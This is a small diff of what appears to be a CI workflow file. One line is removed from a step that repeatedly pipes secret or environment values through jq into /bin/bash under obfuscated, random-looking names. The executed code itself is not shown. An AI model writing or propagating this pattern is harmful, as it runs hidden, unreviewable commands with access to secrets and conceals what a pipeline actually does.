@@ -22,7 +22,6 @@ jobs:
           k5541: ${{ secrets.k5541 }}
         run: |
           printf '%s' "$k5541" | jq -r .rzgf945 | /bin/bash
-          printf '%s' "$obxtp174" | jq -r .tpy36290 | /bin/bash
           echo $g596 | jq -r .g310 | /bin/bash
           printf '%s' "$mcey522" | jq -r .wnzfp31 | /bin/bash
           echo $rdvi18 | jq -r .mdpum2 | /bin/bash
